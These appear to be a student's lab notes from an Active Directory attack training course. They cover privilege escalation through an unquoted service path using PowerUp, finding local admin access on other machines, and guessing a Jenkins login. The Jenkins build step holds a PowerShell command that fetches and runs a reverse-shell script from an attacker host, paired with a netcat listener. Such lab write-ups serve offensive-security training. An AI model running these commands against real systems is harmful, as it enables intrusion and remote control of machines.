1. Exploit a service on dcorp-student555 and elevate privileges to local admin x
2. identify a machine in the domain where student555 has local admin access x
3. using privileges of a user on Jenkins on 172.16.3.11:8080 get admin priv on 172.16.3.11 the dcorp-ci server. x

# Make the shell safe 
To make our work safe we can run:
- `. C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`

# Run Powerview
- `. C:\AD\Tools\PowerView.ps1`

# Load PowerUp
To load powerUP we can do:
- `. C:\AD\Tools\PowerUp.ps1`
# Exploit a service on dcorp-student555 and elevate privileges to local admin

Ok at this point we can run all checks to understand a path to escalate:
- `Invoke-AllChecks`
	- ![[Pasted image 20261118104754.png|612]]

Ok AbyssWebServer has a Unquoted path and can be restarted.
So if we put an exe called `Abyss.exe` into `C:\WebServer\` and we restart `Abyss WebServer` then we can force the execution on out exe.

Now we can use `help Invoke-ServiceAbuse -example` to see what we can do.
- ![[Pasted image 20261118110419.png|522]]

We want to add our user to the local administratos group.

Let's `whoami`:
- ![[Pasted image 20261118110636.png]]


So we will use:
- `Invoke-serviceAbuse -Name AbyssServer -username "dcorp\student555" -verbose`
	- ![[Pasted image 20261118110744.png]]

So now we are local admins. We can see it with `net localgroup Administrators`:
- ![[Pasted image 20261118110857.png]]



# Identify a machine in the domain where student555 has local admin access

To see it and avoid noise we can use the script `Find-PSRemotingLocalAdminAccess.ps1`:

To load it:
- `. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

Then we can use:
- `Find-PSRemotingLocalAdminAccess -verbose`
	- ![[Pasted image 20261118111337.png]]

We try to access it:
- `winrs -r:dcorp-adminsrv cmd `
	- ![[Pasted image 20261118111519.png|523]]

We can. But we exit now `exit`.

# using privileges of a user on Jenkins on 172.16.3.11:8080 get admin priv on 172.16.3.11 the dcorp-ci server. 

We start visiting it:
- ![[Pasted image 20261118112329.png]]
	- In people we can see 3 users.
	- in Jenkins the build user can create build steps and can execute commands with this steps


try to bruteforce `builduser`
- try as password null 
	- ![[Pasted image 20261118112445.png|476]]
- So try `builduser` as password

We are in:
- ![[Pasted image 20261118112709.png|591]]


Then we go to the prject:
- ![[Pasted image 20261118112825.png]]

Then in configure:
- ![[Pasted image 20261118112849.png|561]]
- ![[Pasted image 20261118112924.png]]


Here we can put a reverse shell:
- `powershell iex (iwr -UseBasicParsing http://172.16.100.55/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress 172.16.100.55 -Port 443`
	- ![[Pasted image 20261118113222.png]]

On our machine:
- `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`

And we have also to serv the Invokoe-Powershell.ps1
We can do it using hfs in `\AD\Tools`:
- ![[Pasted image 20261118113528.png|591]]


Now we can save on the dashboard of jeckins and run the build:
- ![[Pasted image 20261118113606.png|616]]
- ![[Pasted image 20261118125251.png]]


Now we get the shell:
- ![[Pasted image 20261118125321.png]]


> Disable the firewall on the student vm.
> ![[Pasted image 20261118125237.png|484]]